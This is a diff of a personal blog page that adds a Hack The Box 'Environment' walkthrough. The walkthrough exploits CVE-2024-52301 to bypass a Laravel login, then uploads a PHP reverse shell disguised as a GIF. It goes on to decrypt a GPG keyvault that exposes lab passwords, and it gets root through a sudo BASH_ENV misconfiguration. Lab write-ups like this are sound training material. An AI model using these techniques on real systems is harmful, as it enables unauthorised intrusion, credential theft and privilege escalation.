@@ -470,8 +470,8 @@
 <meta name="generator" content="Jekyll v3.10.0" />
 <meta property="og:title" content="Environment (HTB) - Walkthrough" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="Cybersecurity Engineer &amp; Penetration Tester specializing in offensive security" />
-<meta property="og:description" content="Cybersecurity Engineer &amp; Penetration Tester specializing in offensive security" />
+<meta name="description" content="-&gt; Overview Exploiting CVE-2024-52301: Laravel Environment Manipulation" />
+<meta property="og:description" content="-&gt; Overview Exploiting CVE-2024-52301: Laravel Environment Manipulation" />
 <link rel="canonical" href="https://kaulikmakwana.github.io/writeups/hackthebox/Environment-Hackthebox-Walkthrough/" />
 <meta property="og:url" content="https://kaulikmakwana.github.io/writeups/hackthebox/Environment-Hackthebox-Walkthrough/" />
 <meta property="og:site_name" content="Kaulik Makwana" />
@@ -480,7 +480,7 @@
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="Environment (HTB) - Walkthrough" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-26T00:00:00+00:00","datePublished":"2025-06-26T00:00:00+00:00","description":"Cybersecurity Engineer &amp; Penetration Tester specializing in offensive security","headline":"Environment (HTB) - Walkthrough","mainEntityOfPage":{"@type":"WebPage","@id":"https://kaulikmakwana.github.io/writeups/hackthebox/Environment-Hackthebox-Walkthrough/"},"url":"https://kaulikmakwana.github.io/writeups/hackthebox/Environment-Hackthebox-Walkthrough/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-26T00:00:00+00:00","datePublished":"2025-06-26T00:00:00+00:00","description":"-&gt; Overview Exploiting CVE-2024-52301: Laravel Environment Manipulation","headline":"Environment (HTB) - Walkthrough","mainEntityOfPage":{"@type":"WebPage","@id":"https://kaulikmakwana.github.io/writeups/hackthebox/Environment-Hackthebox-Walkthrough/"},"url":"https://kaulikmakwana.github.io/writeups/hackthebox/Environment-Hackthebox-Walkthrough/"}</script>
 <!-- End Jekyll SEO tag -->
 
 </head>
@@ -560,7 +560,223 @@
             </header>
 
             <div class="markdown-content prose prose-invert max-w-none font-mono text-xs sm:text-sm w-full" data-aos="fade-up" data-aos-delay="1000">
-                
+                <h1 id="section---overview">-&gt; Overview</h1>
+<p>Exploiting CVE-2024-52301: Laravel Environment Manipulation</p>
+
+<hr />
+<h1 id="section---enumeration">-&gt; Enumeration</h1>
+<h2 id="section-port-scanning">Port Scanning</h2>
+<ul>
+  <li>Started with an nmap scan:
+```shell
+$ nmap -sS -sV -A -T4 -oN nmap.scan 10.10.11.67</li>
+</ul>
+
+<p>Nmap scan report for environment.htb (10.10.11.67)
+Host is up (0.57s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
+| ssh-hostkey: 
+|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
+|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
+80/tcp open  http    nginx 1.22.1
+|_http-title: Save the Environment | environment.htb
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+
+<p>TRACEROUTE (using port 587/tcp)
+HOP RTT       ADDRESS
+1   920.24 ms 10.10.16.1
+2   920.29 ms environment.htb (10.10.11.67)</p>
+
+<p>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</p>
+<h1 id="section-nmap-done-at-tue-jul--8-124656-2025--1-ip-address-1-host-up-scanned-in-14075-seconds">Nmap done at Tue Jul  8 12:46:56 2025 – 1 IP address (1 host up) scanned in 140.75 seconds</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+Only two ports were open: 22 (SSH) and 80 (HTTP). The web server on port 80 appeared to be mostly static. While exploring, I found a mailing page, which revealed the server was running PHP 8.2.28 and Laravel 11.30.0 with debug mode enabled, leaking source code.
+![rootpage-source-code](/assets/images/writeups/hackthebox/Environment/rootpage-source-code.png)
+
+![mailing.png](/assets/images/writeups/hackthebox/Environment/mailing.png)
+
+Next, I performed directory enumeration with dirsearch and found several useful directories:
+```shell
+$ dirsearch -u http://environment.htb/ -t 35 -o environment-dirs.md
+
+# filtering
+$ cat environment-dirs.md | grep 200
+
+200     0B   http://environment.htb/favicon.ico
+200     2KB  http://environment.htb/index.php/login/
+200     2KB  http://environment.htb/login
+200     2KB  http://environment.htb/login/
+200    24B   http://environment.htb/robots.txt
+
+$ cat environment-dirs.md | grep 405
+
+405   245KB  http://environment.htb/upload
+405   245KB  http://environment.htb/upload/
+
+$ cat environment-dirs.md | grep 301
+
+301   169B   http://environment.htb/build    -&gt; REDIRECTS TO: http://environment.htb/build/
+301   169B   http://environment.htb/storage    -&gt; REDIRECTS TO: http://environment.htb/storage/
+</code></pre></div></div>
+
+<p>I then moved to the login page and analyzed its response in Burp Suite. After entering an email and password and checking the “remember” button, I intercepted the request.</p>
+
+<p><img src="/assets/images/writeups/hackthebox/Environment/intercept-login-page" alt="intercept-login-page" /></p>
+
+<p><img src="/assets/images/writeups/hackthebox/Environment/intercept-login-remember-boolean-manipulation.png" alt="intercept-login-remember-boolean-manipulation" /></p>
+
+<p>First, I tested the “remember” parameter by manipulating its value. Changing <code class="language-plaintext highlighter-rouge">remember=True</code> to <code class="language-plaintext highlighter-rouge">remember=Test</code> and forwarding the request, then refreshing the browser, resulted in a source code leak.
+<img src="/assets/images/writeups/hackthebox/Environment/source-code-leak-01.png" alt="source-code-leak-01" /></p>
+
+<p>![<a href="/assets/images/writeups/hackthebox/Environment/source-code-leak-02.png">source-code-leak-02</a></p>
+
+<hr />
+<h1 id="section---exploitation">-&gt; Exploitation</h1>
+<p>After refreshing the page, I observed a source code leak. Analyzing the code, I found a <code class="language-plaintext highlighter-rouge">preprod</code> environment variable configured to allow direct login and dashboard access. This is where CVE-2024-52301 can be exploited using Burp Suite.</p>
+
+<p>I started Burp Suite, refreshed the browser, navigated to the login page, intercepted the request, modified it, and forwarded it.</p>
+
+<p><img src="/assets/images/writeups/hackthebox/Environment/Intercapt-login-page-bypass-preprod-variable-misconfig.png" alt="Intercapt-login-page-bypass-preprod-variable-misconfig" /></p>
+
+<p>To bypass the login, I captured the login request, modified the parameter, and forwarded it:</p>
+<ul>
+  <li>Modified the login parameter to <code class="language-plaintext highlighter-rouge">/login?--env=preprod</code> and forwarded the request.</li>
+</ul>
+
+<p><img src="/assets/images/writeups/hackthebox/Environment/bypass-login-page-access-dashboard.png" alt="bypass-login-page-access-dashboard" /></p>
+
+<p><img src="/assets/images/writeups/hackthebox/Environment/dashboard.png" alt="dashboard" /></p>
+
+<p>This allowed me to bypass the login page and access the dashboard. Next, I attempted to upload a reverse shell. I navigated to the profile section and tried to change the profile photo for user “hish.” The image upload feature was abused to upload a reverse shell.</p>
+
+<p>To upload the reverse shell, I started interception and attempted to upload the shell directly, capturing the request:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Reverse shell used:</span>
+/usr/share/webshells/php/php-reverse-shell.php
+<span class="c"># Upload it.</span>
+</code></pre></div></div>
+
+<p>While intercepting, I modified the request content type and file name, then forwarded it:</p>
+<ul>
+  <li>filename=”rev-shell.php.”</li>
+  <li>content-type: image/gif</li>
+  <li>Added GIF header <code class="language-plaintext highlighter-rouge">GIF89a</code> before the <code class="language-plaintext highlighter-rouge">&lt;?php</code> tag in the shell script</li>
+  <li>Forwarded the request</li>
+</ul>
+
+<p><img src="/assets/images/writeups/hackthebox/Environment/reverse-shell-upload-01.png" alt="reverse-shell-upload-01" /></p>
+
+<p>This succeeded. Initially, uploading with the default filename <code class="language-plaintext highlighter-rouge">rev-shell.php</code> did not work, but changing the extension to <code class="language-plaintext highlighter-rouge">php.</code> allowed the upload, and I received a shell.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rlwrap ncat <span class="nt">-nvlp</span> 1234 
+Ncat: Version 7.95 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on <span class="o">[</span>::]:1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.10.11.67:56816.
+<span class="nv">$ </span><span class="nb">whoami
+</span>www-data
+<span class="nv">$ </span>/bin/bash <span class="nt">-i</span>
+www-data@environment: <span class="nb">cd</span> /home/hish
+www-data@environment: <span class="nb">ls
+</span>backup
+exp.sh
+user.txt
+www-data@environment: <span class="nb">cat</span> /home/hish/user.txt
+44b9d##########################
+</code></pre></div></div>
+
+<p>User flag obtained.</p>
+
+<hr />
+<h1 id="section---post-exploitation">-&gt; Post-Exploitation</h1>
+<h2 id="section-privilege-escalation">Privilege Escalation</h2>
+
+<p>To escalate privileges, I needed access to the user account. I found a <code class="language-plaintext highlighter-rouge">backup</code> directory under <code class="language-plaintext highlighter-rouge">/home/hish</code> containing a GPG-encrypted file: <code class="language-plaintext highlighter-rouge">keyvault.gpg</code>.</p>
+
+<p>To decrypt it:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check file type to confirm it's a GPG file</span>
+www-data@environment:/home/hish/backup<span class="nv">$ </span>file keyvault.gpg
+keyvault.gpg: PGP RSA encrypted session key - keyid: B755B0ED D6CFCFD3 RSA <span class="o">(</span>Encrypt or Sign<span class="o">)</span> 2048b <span class="nb">.</span>
+
+<span class="c"># Copy keyvault.gpg and .gnupg to /tmp</span>
+www-data@environment:/home/hish/backup<span class="nv">$ </span><span class="nb">cp </span>keyvault.gpg /tmp
+www-data@environment:/home/hish/backup<span class="nv">$ </span><span class="nb">cp</span> <span class="nt">-r</span> .gnupg /tmp
+www-data@environment:/home/hish/backup<span class="nv">$ </span><span class="nb">cd</span> /tmp/
+
+<span class="c"># Set GPG environment</span>
+www-data@environment:/tmp<span class="nv">$ </span><span class="nb">export </span><span class="nv">HOME</span><span class="o">=</span>/tmp
+
+<span class="c"># List secret keys</span>
+www-data@environment:/tmp<span class="nv">$ </span>gpg <span class="nt">--list-secret-keys</span>
+gpg: WARNING: unsafe permissions on homedir <span class="s1">'/tmp//.gnupg'</span>
+/tmp//.gnupg/pubring.kbx
+<span class="nt">------------------------</span>
+pub   rsa2048 2025-01-11 <span class="o">[</span>SC]
+      F45830DFB638E66CD8B752A012F42AE5117FFD8E
+uid           <span class="o">[</span>ultimate] hish_ &lt;hish@environment.htb&gt;
+sub   rsa2048 2025-01-11 <span class="o">[</span>E]
+
+<span class="c"># Decrypt the file</span>
+www-data@environment:/tmp<span class="nv">$ </span>gpg <span class="nt">--decrypt</span> keyvault.gpg
+gpg: WARNING: unsafe permissions on homedir <span class="s1">'/tmp//.gnupg'</span>
+gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
+      <span class="s2">"hish_ &lt;hish@environment.htb&gt;"</span>
+PAYPAL.COM -&gt; Ihaves0meMon<span class="nv">$yhere123</span>
+ENVIRONMENT.HTB -&gt; marineSPm@ster!!
+FACEBOOK.COM -&gt; summerSunnyB3ACH!!
+
+Password found:  marineSPm@ster!!
+</code></pre></div></div>
+
+<p>I then attempted SSH access:
+![[ssh-hish.png]]</p>
+
+<h3 id="section-root-access">Root Access</h3>
+<p>I began by checking sudo permissions:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hish@environment:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>hish on environment:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, env_keep+<span class="o">=</span><span class="s2">"ENV BASH_ENV"</span>, use_pty
+
+User hish may run the following commands on environment:
+    <span class="o">(</span>ALL<span class="o">)</span> /usr/bin/systeminfo
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">systeminfo</code> binary could be run as root, and the <code class="language-plaintext highlighter-rouge">env_keep</code> variable was misconfigured, allowing a custom <code class="language-plaintext highlighter-rouge">BASH_ENV</code> to be passed to sudo.</p>
+
+<p>To exploit this, I created <code class="language-plaintext highlighter-rouge">/tmp/root.sh</code> with the content <code class="language-plaintext highlighter-rouge">/bin/bash -i</code> and made it executable:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hish@environment:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'/bin/bash -i'</span> <span class="o">&gt;</span> /tmp/root.sh
+hish@environment:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x /tmp/root.sh
+hish@environment:/tmp<span class="nv">$ </span><span class="nb">sudo </span><span class="nv">BASH_ENV</span><span class="o">=</span>/tmp/root.sh /usr/bin/systeminfo
+root@environment:/tmp#     
+root@environment:/tmp# <span class="nb">cat</span> /root/root.txt
+e458###########################
+</code></pre></div></div>
+
+<hr />
+<h1 id="section-tools-used">Tools Used</h1>
+<ul>
+  <li>nmap</li>
+  <li>dirsearch</li>
+  <li>burpsuite</li>
+  <li>firefox</li>
+</ul>
+
+<h1 id="section-useful-references">Useful references:</h1>
+<p>CVE-2024-52301</p>
+<ul>
+  <li>https://github.com/Nyamort/CVE-2024-52301</li>
+  <li>https://nvd.nist.gov/vuln/detail/CVE-2024-52301</li>
+  <li>https://github.com/laravel/framework/security/advisories/GHSA-gv7v-rgg6-548h</li>
+</ul>
+
+<hr />
+
 
             </div>
 
